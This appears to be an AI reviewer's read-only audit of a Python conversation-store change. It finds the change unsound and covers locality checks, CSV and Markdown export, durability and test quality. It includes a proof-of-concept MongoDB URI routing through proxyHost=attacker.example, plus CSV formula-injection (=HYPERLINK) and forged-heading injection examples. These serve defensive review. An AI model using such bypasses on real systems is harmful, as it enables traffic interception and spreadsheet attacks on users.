# codex-seat — CHG-20260823-17 round 2 (the code)

Dispatched via `codex exec --sandbox read-only` on
[`conversation-store-round2-brief.md`](conversation-store-round2-brief.md).
Committed whole and unedited below.

---

# VERDICT: not sound

## The single worst thing

> `query = parse_qs(parts.query, keep_blank_values=True)`  
> `if "replicaSet" in query:`  
> …  
> `target = uri if remote else _hardened(local_mongo_uri(uri))`  
> `self._client = pymongo.MongoClient(target, ...)`  
> — [conversations.py](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:187)

The locality check approves Mongo options it has not examined. This command demonstrates an accepted URI that explicitly sends the connection through an off-machine proxy:

```powershell
$env:PYTHONPATH='src'
python -c "from ai_sdlc_runner.conversations import *; u='mongodb://127.0.0.1/db?proxyHost=attacker.example&proxyPort=1080'; print(_hardened(local_mongo_uri(u)))"
```

Result:

```text
mongodb://127.0.0.1/db?proxyHost=attacker.example&proxyPort=1080&directConnection=true
```

The code constrains the seed host and topology discovery, then passes arbitrary unreviewed client options to `MongoClient`. That is precisely “a coarse check answering safe about something it had not examined.”

Option-name handling is also case-sensitive although Mongo options are not safely constrained by casing:

```text
ACCEPT ...?replicaset=rs0
ACCEPT ...?directconnection=false&directConnection=true
```

Thus the standing local-only claim is false.

## Round-1 findings

| Round-1 finding | Status | Evidence |
|---|---|---|
| The journal cannot produce the declared conversation | answered | A separate append log exists; `_ask` writes ask/answer/unanswered directly at [engine.py:582](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/engine.py:582). |
| Loopback seed does not constrain Mongo topology discovery | partially | `directConnection=true` is added at [conversations.py:199](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:199), but proxy options and case variants bypass the claimed locality policy. |
| `(project, run_id)` collides across executions | answered | A UUID conversation ID is minted and persisted beside the journal at [conversations.py:546](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:546). |
| Project must not default from the plan directory | answered | `--project` defaults to `None` at [cli.py:417](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/cli.py:417); names are hashed before becoming paths. |
| CSV formula injection | partially | Six leading characters are defused at [conversations.py:745](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:745), but LF/leading-whitespace variants are emitted unchanged. I produced a CSV cell beginning `\n=HYPERLINK(...)`. |
| Spreadsheet 32,767-character truncation | answered | The complete body is retained and oversized body/summary cells are flagged at [conversations.py:755](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:755). |
| Backticks can terminate Markdown fences | partially | Turn bodies use calculated fences, but project metadata is interpolated raw at [conversations.py:721](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:721). Project `ok\n# FORGED HEADING` creates an injected heading outside any fence. |
| Remote-store relaxation has nowhere to record during export | prose only | `_open_conversation` records it for `run`/`serve` at [cli.py:453](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/cli.py:453). `cmd_export` uses `_read_store` and never appends a relaxation at [cli.py:376](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/cli.py:376). This is the exact case the design claimed to fix. |
| “Store failure must not be silent” lacked a mechanism | partially | Failures enter `write_errors` and later `RunReport.store_errors`, but no code writes the promised stderr line and CLI never prints `store_errors`. No `note` is written either. See [conversations.py:670](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:670) and [engine.py:1017](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/engine.py:1017). |
| Backends had no stated common guarantees | partially | The guarantees are stated, but file uniqueness is not implemented: `FileBackend.append` blindly appends at [conversations.py:295](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:295). The duplicate-sequence test only attempts to reopen the header, not append a duplicate sequence. |
| Operator/project/run strings must not become path components | answered | Project names are hashed; conversation IDs are UUID hex. |
| Answering model was absent from durable records | partially | Ordinary/model-panel asks pass `model`, but seat-panel and survey calls pass only `seat`, so their stored `model` is `None`; see [engine.py:1345](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/engine.py:1345) and [engine.py:1403](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/engine.py:1403). A seat-routed backend therefore remains unidentified. |
| Default `file` backend is not a NoSQL database | prose only | The implementation and documentation admit this; behavior was not changed. |
| CSV cannot contain a comment declaring itself lossy | answered | The fixed `_json` columns and truncation flag provide structural notice. |

## New findings

### 1. Not every failed ask is recorded

The ask is written before `_open`, but exception handling begins only after `_open`:

```python
conversation.ask(...)
session = _open(factory, seat, model)
...
try:
    result = session.ask(order)
except Exception:
    conversation.unanswered(...)
```

— [engine.py:587](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/engine.py:587)

If session creation fails, or the reused-session guard fails, the conversation contains an `ask` with no `unanswered` turn. If `session.close()` raises, that failure is also not recorded. README’s “each ask that failed” claim is false.

### 2. Store failures remain silent to the operator

`_guarded` only appends to an in-memory list. `_finish` copies it into the report, but neither CLI nor server prints it, and there is no stderr write anywhere. The design and CHG explicitly claim three channels—note, report, stderr—but only the report field exists.

This also means a failed `closed` write is not durable anywhere; the evidence of failure disappears with the process unless a caller separately serializes the report.

### 3. The claimed uniqueness guarantee is a name standing in for a constraint

The design promises `(conversation_id, seq)` uniqueness for every backend. File writes perform no duplicate check, locking, or exclusive operation. TinyDB uses a check-then-insert sequence, which is racy. Only Mongo has an actual unique index.

`test_the_same_seq_is_never_written_twice` at [test_conversations.py:266](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/tests/test_conversations.py:266) never writes the same sequence twice; it tests duplicate conversation opening instead.

### 4. Crash durability is overstated

The design says every write is durable “at the moment the turn occurs.” File writes are opened and closed per turn, but there is no `flush` plus `os.fsync`, nor directory synchronization for newly created files and markers. Process-level buffering is mostly addressed by closing; OS/power-loss durability is not.

The partial-write test manually appends malformed JSON. It does not kill a real writer during `append`, as the repository’s own KN-6 verification standard requires.

### 5. Resuming after a read failure can silently create a broken logical state

At [conversations.py:579](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/conversations.py:579), any `ConversationError` while reading the marker’s conversation resets `_opened=False`. `open()` then tries to create the same conversation ID; that failure is swallowed by `_guarded`, after which `_opened` becomes true and turns continue attempting to append.

A missing/corrupt store behind a valid journal marker is therefore treated as recoverable without actually establishing storage.

### 6. JSON export is not unconditionally JSON

Python’s default encoder emits non-standard `NaN`:

```python
export_conversation({"turns": [{"value": float("nan")}]}, "json")
```

produced `NaN`, which a strict JSON parser rejected. Use `allow_nan=False` if the API claims JSON rather than Python’s permissive extension.

### 7. Some real operator decisions are omitted

`_finish` adds unused confirmations to `report.confirmations` with `extend` at [engine.py:999](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/src/ai_sdlc_runner/engine.py:999), but does not create conversation decision turns for them. The source-scanning test looks only for `report.confirmations.append`, so it misses this path.

### 8. Test quality

Most unit tests exercise behavior, but several are weak:

- `test_the_same_seq_is_never_written_twice` tests header reopening, not duplicate sequence insertion.
- `test_a_failed_store_write_never_fails_a_run_and_is_never_silent` merely checks that `RunReport.as_dict()` has a field. It never checks the failure reaches that field, stderr, a note, CLI output, or a real walk.
- `test_every_turn_kind_the_module_declares_can_actually_be_written` calls methods directly. It proves the names have writers, not that real flows reach those writers.
- `test_the_engine_records_the_decisions_the_report_records` scans a 900-character source window. Its occurrence search also reuses the second occurrence for every `i > 0`. It misses `extend` and can pass because unrelated text appears nearby.
- Mongo tests enumerate known bad spellings but do not constrain the option vocabulary; proxy and case variants pass.
- Backend tests explicitly do not execute TinyDB or Mongo behavior.

The two pre-existing literal-source assertions are:

- [test_undecided.py:170](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/tests/test_undecided.py:170)
- [test_suspend_resume.py:205](/C:/Users/haruharu/Documents/GitHub/ai-sdlc-runner/.claude/worktrees/ai-sdlc-handshake-a967df/tests/test_suspend_resume.py:205)

Their intent—guarding early exits through `_finish`—is legitimate, but literal call text is not sufficient proof. Indeed, `walk` still has `_finish(stop, confirmations)` calls at lines 1260, 1455, and 1459 without the conversation argument. The gate cases happen to have already called `_finish`; the effect-failure case has not, so a stopped effect path can omit the conversation close and store-error collection.

### 9. Behavior without `--project`

I found no intended semantic change when `--project` is absent: `_open_conversation` returns `None`, and `RunConfig.conversation` defaults to `None`. The new engine branches are guarded accordingly.

That narrow claim appears correct by inspection, but the full regression suite could not be executed in this read-only environment.

## What I could not check

The sandbox denied every writable temporary directory, so:

- `pytest` failed before collection with “No usable temporary directory.”
- The requested live `examples/plan.json` run could not create its journal or conversation store.
- I could not independently verify the CHG’s “20 nodes, 17 asks, 38 stored lines” evidence.
- TinyDB and PyMongo are not installed, so their actual persistence, option parsing, duplicate behavior, and topology discovery were not exercised.
- I could not perform a killed-process, power-loss, or true concurrent-writer test.
- I could generate adversarial CSV text, but not verify spreadsheet execution in Excel/LibreOffice.

Required follow-up: a writable isolated directory, PyMongo plus a controlled proxy/replica-set fixture, TinyDB, a real spreadsheet consumer, and multiprocess/forced-exit tests.
